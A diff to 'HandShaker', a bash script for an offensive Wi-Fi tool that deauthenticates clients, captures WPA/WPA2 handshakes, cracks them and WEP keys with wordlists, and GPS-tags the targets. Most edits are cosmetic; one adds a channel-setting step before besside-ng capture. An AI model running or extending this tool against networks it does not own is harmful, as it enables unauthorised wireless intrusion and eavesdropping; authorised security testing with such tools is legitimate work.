@@ -15,7 +15,6 @@
 
 fhelp()																	#Help
 {
-	clear
 	echo $RST""" 
 HandShaker - Detect, deauth, capture, crack WPA/2 handshakes and WEP Keys automagically. 
  by d4rkcat <rfarage@yandex.com>
@@ -51,7 +50,7 @@ HandShaker - Detect, deauth, capture, crack WPA/2 handshakes and WEP Keys automa
 		 handshaker -c handshake.cap -w wordlist.txt	 ~ Crack handshake.cap with wordlist.
 		 
  all your AP are belong to us..
-"""
+"
 	exit
 }
 
@@ -110,10 +109,7 @@ pyrit"
 	clear
 	if [ $WEP = 1 ] 2> /dev/null
 		then
-			WPW='WEP'
-			BESS=1
-			EVIL=""
-			MDK=""
+			WPW='WEP';BESS=1;EVIL="";MDK=""
 		else
 			WPW='WPA'
 	fi
@@ -655,9 +651,9 @@ fautobot()																#Automagically find new target clients
  [*] BSSID: $BSSID
  [*] Client: $CLIENT
  [*] Channel: $CHAN
- [*] Power: $POWER"""
-	echo $RED" [*] We need this handshake [*] "$RST
-	
+ [*] Power: $POWER$RED
+ [*] We need this handshake [*] "$RST
+
 	if [ $BESS = 1 ] 2> /dev/null
 		then
 			killall airodump-ng
@@ -901,6 +897,7 @@ fautocap()																#Deauth targets and collect handshakes
 									fi
 							fi	
 						else
+							iw $MON1 set channel $CHAN
 							BESI=$(besside-ng -W -b $BSSID -c $CHAN $MON1 | grep Pwn | cut -d ']' -f 2)
 					fi
 					ESSID=$(echo $ESSID | sed 's/ /_/g')
@@ -1089,7 +1086,7 @@ fanalyze()																#Analyze pcap for handshakes
 fcrack()																#Crack handshakes
 {
 	PFILE=$OUTDIR/$ESSID-$DATE".cap"
-	ESSID=$(echo $ESSID | sed 's/_/ /g')
+	ESSID=$(echo "$ESSID" | sed 's/_/ /g')
 	clear
 	if [ $WORDLIST -z ] 2> /dev/null
 		then
@@ -1127,16 +1124,16 @@ fcrack()																#Crack handshakes
 fstartgps()																#Configure GPS
 {
 	clear
-	echo $GRN" [*] On your$RED android$GRN phone:"$BLU
-	echo " [1] Enable GPS"
-	echo " [2] Download BlueNMEA from the Google Play store and run it"
-	echo " [3] Connect usb cable to laptop and enable usb tethering"
-	echo
-	echo $GRN" [*] On your$RED laptop$GRN:"$BLU
-	echo " [1] Disconnect from any wifi "
-	echo " [2] Turn any firewalls off"
-	echo " [3] Connect to your phone AP"
-	echo
+	echo $GRN""" [*] On your$RED Android$GRN phone:$BLU
+ [1] Enable GPS
+ [2] Download BlueNMEA from the Google Play store and run it
+ [3] Connect usb cable to laptop and enable usb tethering$GRN
+
+ [*] On your$RED Laptop$GRN:$BLU
+ [1] Disconnect from any wifi
+ [2] Turn any firewalls off
+ [3] Connect to your phone AP
+"
 	read -p $GRN"  >Press enter to continue once connected< "
 	echo
 	echo $BLU" [*] Checking GPS status"
@@ -1155,10 +1152,10 @@ fstartgps()																#Configure GPS
 			fi
 		done
 	clear
-	echo $RED" [>]$GRN SATELLITE UPLINK ESTABLISHED$RED [<]"
-	echo
-	echo $GRN" [*] GPS tagging enabled!, co-ordinates will appear in $OUTDIR/got "
-	echo $RED" [*] We get GPS once the$GRN icon is locked in on your android!"
+	echo $RED""" [>]$GRN SATELLITE UPLINK ESTABLISHED$RED [<]$GRN
+
+ [*] GPS tagging enabled!, co-ordinates will appear in $OUTDIR/got
+ [*] We get GPS once the$RED icon is locked in$GRN on your android!"
 	sleep 3
 }
 	
@@ -1199,7 +1196,7 @@ fgetgps()
  $RED[$GRN@$RED]$GRN $DEGS2 $RED$SECOND $GRN$MINS2$RED Minutes $GRN$SECS2$RED Seconds $GRN
  
  $RED[$GRN@$RED]$GRN Map URL: $URL
-		"""
+"
 	LOCATION="$DEGS1 $FIRST $MINS1 Minutes $SECS1 Seconds, $DEGS2 $SECOND $MINS2 Minutes $SECS2 Seconds"
 	URL=' - '$URL
 }
@@ -1209,12 +1206,15 @@ fexit()																	#Exit
 	killall mdk3 2> /dev/null
 	killall aircrack-ng 2> /dev/null
 	killall airbase-ng 2> /dev/null
+	killall airodump-ng 2> /dev/null
+	killall besside-ng 2> /dev/null
 	rm -rf $HOME/tmp* 2> /dev/null
 	rm -rf besside.log 2> /dev/null
 	rm -rf wep.cap 2> /dev/null
 	rm -rf wpa.cap 2> /dev/null
 	if [ $CRACK = "1" ] 2> /dev/null
 		then
+			echo $RED" [*]$GRN Goodbye...$RST"
 			exit
 		else
 			MOND="$(ifconfig | grep mon | cut -d ' ' -f 1)"
